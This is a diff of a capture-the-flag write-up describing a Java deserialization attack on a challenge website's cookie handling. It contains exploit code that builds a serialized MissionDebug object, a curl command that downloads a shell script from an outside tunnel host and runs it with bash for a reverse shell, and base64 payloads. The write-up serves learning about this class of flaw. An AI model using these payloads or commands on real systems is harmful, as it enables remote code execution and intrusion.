@@ -129,13 +129,13 @@ import java.io.Serializable;
         }
     }
 ```
-- From the codes above, reading `MissionDebug` we see potential traget `runtime.exec((String) this.debug);` this statement is executing a shell command :D AMAZING!
-- Bug how can we make it do that? there is no link between debug and the website!
-- Going back to the first file we see `ObjectOutputStream` and `byteArrayOutputStream`which are known to have relation with **Java Deserialization Attacks** :D and so far I only solved one of these challs before but it was much simpler but the same/similar concept after all
-- From the first file we see that it's getting the value of **Mission** from the **cookies**, trying to post a mission using the website page seems to not work at all
+- From the codes above, reading `MissionDebug` we see potential target `runtime.exec((String) this.debug);` this statement is executing a shell command :D AMAZING!
+- But how can we make it do that? there is no link between debug and the website!
+- Going back to the first file we see `ObjectOutputStream` and `byteArrayOutputStream`which are known to have relation with **Java Deserialization Attacks** :D and so far I've only solved one of such challs before but it was much simpler but mostly all are very similar concept
+- From the first file we see that it's getting the value of **latest_mission** from the **cookies**, trying to post a mission using the website page seems to not work at all (/mission)
 - ![5.png](./assets/5.png)
 - Seems like there is some hidden restrictions on any page that don't match specific pages like `/backup` so that means we have to inject the cookies manually based on the code we understood in the first file
-- We need to create a Java Serialized object (that calls the `MissionDebug#readObject` and set `debug` field to the shell command we like) that serialized object must be encoded in base64 as the source code states
+- We need to create a Java Serialized object (that calls the `MissionDebug#readObject` and set `debug` field to the shell command we like) that serialized object must be encoded in base64 as the source code states (Note that `readObject` is called automatically when the object is deserialized so it will be called by MissionController)
 - With some searching I found this amazing tool called [ysoserial](https://github.com/frohoff/ysoserial) and [Java-Deserialization-Exploit](https://github.com/njfox/Java-Deserialization-Exploit) but I didn't dig deep into them as they seem to have specific exploits based on the imported packages which I didn't find any matches for
 - So I searched more until I found this [article from PortSwigger](https://portswigger.net/web-security/deserialization) and [this](https://portswigger.net/web-security/deserialization/exploiting) and this [important example](https://github.com/PortSwigger/serialization-examples)
 - After understanding the idea better and better and from the example link I tried to recreate the files and packages and make a serialized object encoded with base64 to put it in the cookies to give me RCE!
@@ -155,9 +155,9 @@ public class MissionDebug implements Serializable {
     private static final long serialVersionUID = 298788778888997655L;
     private String debug;
 
-    public MissionDebug(String debug) {
-        this.debug = debug;
-    }
+    public MissionDebug(String debug) { // Added
+        this.debug = debug; // Added
+    } // Added
 
     private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
 
@@ -171,20 +171,20 @@ public class MissionDebug implements Serializable {
     }
 }
 ```
-- Since `debug` field is private I had to add a way to give it a value, either by using Reflections or by using a constructor like this
+- Since `debug` field is private I had to add a way to give it a value, either by using **Reflections** or by using a **constructor** like this
 ```java
     public MissionDebug(String debug) {
         this.debug = debug;
     }
 ```
-- or with Reflection like this
+- or with Reflections like this
 ```java
     MissionDebug mission = new MissionDebug();
     Field debug = mission.getClass().getDeclaredField("debug");
     debug.setAccessible(true);
     debug.set(mission, new String("PAYLOAD"));
 ```
-- I went with the first method (constructor)
+- But I went with the first method (constructor)
 - My Main.java code
 ```java
 package com.yogosha;
@@ -200,7 +200,7 @@ import java.util.Base64;
 class Main {
         public static void main(String[] args) throws Exception {
         String req = "curl https://social-plums-juggle-86-108-21-39.loca.lt/shell.sh -o /tmp/F30s.sh"; // run first to download the shell
-        // String req = "bash /tmp/F30s.sh"; // run second to activate the shell
+        // String req = "bash /tmp/F30s.sh"; // run second to activate the shell (wait a minute before executing this - it might take sometime to download the .sh file)
 
         MissionDebug missionDebug = new MissionDebug(req);
         String serializedObject = serialize(missionDebug);
@@ -253,10 +253,10 @@ rO0ABXNyAB5jb20ueW9nb3NoYS51dGlscy5NaXNzaW9uRGVidWcEJYLPtI0rFwIAAUwABWRlYnVndAAS
 - If you try to decode it you may be able to read some stuff
 - ![9.png](./assets/9.png)
 - You can see there the class name and debug field with its value
-- Visit `/latest_mission` & set the `lastest_mission` cookie of the website to the base64 value
+- Visit `/latest_mission` & set the `latest_mission` cookie of the website to the base64 value
 - ![10.png](./assets/10.png)
-- Now reload the page and check your ngrok/localtunnel activity, it should receive a request to F30s.sh
-- Here is my servers setup to listen to TCP for Netcat and HTTP for F30s.sh download 
+- Now reload the page and check your ngrok/localtunnel activity, it should receive a request to F30s.sh (localtunnel doesn't have a dashboard like ngrok)
+- Here is my connections setup to listen to TCP for Netcat and HTTP for F30s.sh download 
 - ![12.png](./assets/12.png)
 - After sending the second serialized object
 - `rO0ABXNyAB5jb20ueW9nb3NoYS51dGlscy5NaXNzaW9uRGVidWcEJYLPtI0rFwIAAUwABWRlYnVndAASTGphdmEvbGFuZy9TdHJpbmc7eHB0ABFiYXNoIC90bXAvRjMwcy5zaA==`
